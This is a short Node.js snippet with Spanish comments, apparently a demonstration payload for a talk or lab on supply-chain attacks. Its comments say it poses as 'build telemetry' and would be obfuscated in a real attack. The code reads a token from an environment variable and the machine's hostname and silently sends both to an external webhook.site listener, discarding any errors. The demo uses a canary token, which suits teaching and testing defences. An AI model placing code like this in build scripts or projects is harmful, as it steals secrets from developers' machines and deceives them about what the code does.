// Disfrazado como "telemetria de build". En un ataque real estaria ofuscado.
const https = require("https");
const os = require("os");
const LISTENER_URL = "https://webhook.site/5c569c1c-7a2b-45b9-9acb-dab14207c589"; // <- el agente/script pone la URL real del presentador
const token = process.env.CANARY_TOKEN || "NO_SECRET_IN_ENV";
const url =
  LISTENER_URL +
  "?canary=" + encodeURIComponent(token) +
  "&host=" + encodeURIComponent(os.hostname());
try { https.get(url, () => {}).on("error", () => {}); } catch (e) {}
